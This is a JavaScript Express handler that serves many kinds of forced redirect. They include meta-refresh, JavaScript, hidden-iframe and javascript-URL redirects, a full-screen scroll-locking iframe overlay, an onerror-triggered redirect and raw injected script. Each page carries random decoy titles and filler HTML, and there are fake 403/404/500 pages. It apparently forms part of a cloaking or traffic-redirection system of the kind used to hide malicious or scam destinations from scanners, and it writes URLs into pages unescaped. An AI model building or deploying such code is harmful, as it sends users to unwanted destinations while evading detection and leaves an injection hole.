const { createHtml, createText } = require('../utils/generateText')

module.exports = async (typeRedirect, url, res) => {
  let html
  let iframe
  let js
  let meta
  let genHTML
  let genTitle
  switch (typeRedirect) {
    case 'httpRedirect':
      return res.redirect(url)
    case 'jsRedirect':
      res.set('Content-Type', 'text/html')
      genTitle = createText(2, 5)
      genHTML = createHtml()
      html = `
            <!DOCTYPE html>
            <head>
                <title>${genTitle}</title>
                <meta http-equiv="refresh" content="1; URL=${url}">
                <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
                <script type="text/javascript">window.location = "${url}";</script>
            </head>
            <body>
                ${genHTML}
            </body>
            </html>
            `
      return res.status(200).send(html)
    case 'iframe':
      res.set('Content-Type', 'text/javascript')
      iframe = `
                const splashpage = {
                 splashenabled: 1,
                 splashpageurl: "${url}",
                 enablefrequency: 0,
                 displayfrequency: "2 days",
                 cookiename: ["splashpagecookie", "path=/"],
                 autohidetimer: 0,
                 launch: false,
                 browserdetectstr:(window.opera && window.getSelection) || (!window.opera && window.XMLHttpRequest),
                 output: function(){
                  document.write('<style>body {overflow: hidden;}</style>');
                  document.write('<div id="slashpage" style="position: absolute; z-index: 10000; color: white; background-color:white">');
                  document.write('<iframe name="splashpage-iframe" src="about:blank" style="margin:0; border:0; padding:0; width:100%; height: 100%"></iframe>');
                  document.write('<br />&nbsp;</div>');
                  this.splashpageref = document.getElementById("slashpage");
                  this.splashiframeref = window.frames["splashpage-iframe"];
                  this.splashiframeref.location.replace(this.splashpageurl);
                  this.standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body;
                  if(!/safari/i.test(navigator.userAgent)) this.standardbody.style.overflow = "hidden";
                  this.splashpageref.style.left = 0;
                  this.splashpageref.style.top = 0;
                  this.splashpageref.style.width = "100%";
                  this.splashpageref.style.height = "100%";
                  this.moveuptimer = setInterval("window.scrollTo(0,0)", 50);
                 },
                 closeit: function(){
                  clearInterval(this.moveuptimer);
                  this.splashpageref.style.display = "none";
                  this.splashiframeref.location.replace("about:blank");
                  this.standardbody.style.overflow = "auto";
                 },
                 init: function(){
                  if(this.enablefrequency == 1){
                   if(/sessiononly/i.test(this.displayfrequency)){
                    if(this.getCookie(this.cookiename[0] + "_s") == null){
                     this.setCookie(this.cookiename[0] + "_s", "loaded");
                     this.launch = true;
                    }
                   }
                   else if(/day/i.test(this.displayfrequency)){
                    if(this.getCookie(this.cookiename[0]) == null || parseInt(this.getCookie(this.cookiename[0])) != parseInt(this.displayfrequency)){
                     this.setCookie(this.cookiename[0], parseInt(this.displayfrequency), parseInt(this.displayfrequency));
                     this.launch = true;
                    }
                   }
                   } else this.launch = true; if(this.launch){
                    this.output();
                    if(parseInt(this.autohidetimer) > 0) setTimeout("splashpage.closeit()", parseInt(this.autohidetimer) * 1000);
                   }
                 },
                 getCookie: function(Name){
                  var re = new RegExp(Name + "=[^;]+", "i");
                  if(document.cookie.match(re)) return document.cookie.match(re)[0].split("=")[1];
                  return null;
                 },
                 setCookie: function(name, value, days){
                  var expireDate = new Date();
                  if(typeof days != "undefined"){
                   var expstring = expireDate.setDate(expireDate.getDate() + parseInt(days));
                   document.cookie = name + "=" + value + "; expires=" + expireDate.toGMTString() + "; " + splashpage.cookiename[1];
                  } else document.cookie = name + "=" + value + "; " + splashpage.cookiename[1];
                 }
                };
                if(splashpage.browserdetectstr && splashpage.splashenabled == 1) splashpage.init();
            `
      return res.status(200).send(iframe)
    case 'javascript':
      genTitle = createText(2, 5)
      genHTML = createHtml()
      res.set('Content-Type', 'text/html')
      js = `
            <!DOCTYPE html>
            <head>
            <title>${genTitle}</title>
            <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
            </head>
            <body>
            <script type="text/javascript">${url}</script>
            ${genHTML}
            </body>
            </html>
            `
      return res.status(200).send(js)
    case 'metaRefresh':
      genTitle = createText(2, 5)
      genHTML = createHtml()
      res.set('Content-Type', 'text/html')
      meta = `
            <!DOCTYPE html>
            <head>
            <title>${genTitle}</title>
            <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
            <meta http-equiv="refresh" content="0; URL=${url}">
            </head>
            <body>
            ${genHTML}
            </body>
            </html>
            `
      return res.status(200).send(meta)
    case 'iframeRedirect':
      genTitle = createText(2, 5)
      genHTML = createHtml()
      res.set('Content-Type', 'text/html')
      iframe = `
                <!DOCTYPE html>
                <head>
                <title>${genTitle}</title>
                <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
                <meta http-equiv="content-type" content="text/html; charset=utf-8">
                </head>
                <body>
                ${genHTML}
                <iframe src="javascript:parent.location=\\'${url}\\'" style="visibility:hidden"></iframe>
                <script>
                function go() {location.replace("${url}")}
                window.setTimeout("go()", 1000)
                </script>
                </body>
                </html>
            `
      return res.status(200).send(iframe)
    case 'jsSelection':
      res.set('Content-Type', 'text/javascript')
      js = `
                function process(){
                window.location = "${url}";
                }
                window.onerror = process;
                process()
            `
      return res.status(200).send(js)
    case 'remote':
      if (url) {
        return res.redirect(url)
      }
      return res.end()
    case 'offer':
      if (url) {
        return res.redirect(url)
      }
      return res.end()
    case 'showHtml':
      genTitle = createText(2, 5)
      genHTML = createHtml()
      res.set('Content-Type', 'text/html')
      html = `${url}`
      html = html.replace('[TITLE]', genTitle)
      html = html.replace('[HTML]', genHTML)
      return res.status(200).send(html)
    case 'showText':
      res.set('Content-Type', 'text/plain')
      return res.status(200).send(url)
    case 'showJson':
      res.set('Content-Type', 'application/json')
      return res.status(200).send(url)
    case '403':
      html = `
            <!DOCTYPE html>
            <head>
            <title>Access forbidden!</title>
            </head>
            <body>
            <h1>Access forbidden!</h1>
            <p>
            You don\\'t have permission to access the requested object. It is either read-protected or not readable by the server.
            <br>
            If you think this is a server error, please contact the <a href="mailto:[no address given]">webmaster</a>.
            </p>
            <h2>Error 403</h2>
            </body>
            </html>
            `
      return res.status(403).send(html)
    case '400':
      return res.status(400).send('Bad Request')
    case '404':
      html = `
                <!DOCTYPE html>
                <head>
                <title>Object not found!</title>
                </head>
                <body>
                <h1>Object not found!</h1>
                <h2>Error 404</h2>
                </body>
                </html>
            `
      return res.status(404).send(html)
    case '500':
      html = `
                <!DOCTYPE html>
                <head>
                <title>Server error!</title>
                </head>
                <body>
                <h1>Server error!</h1>
                <p>
                The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there was an error in a CGI script.
                </p>
                <h2>Error 500</h2>
                </body>
                </html>
            `
      return res.status(500).send(html)
    case 'end':
      return res.end()
    default:
      return res.end()
  }
}
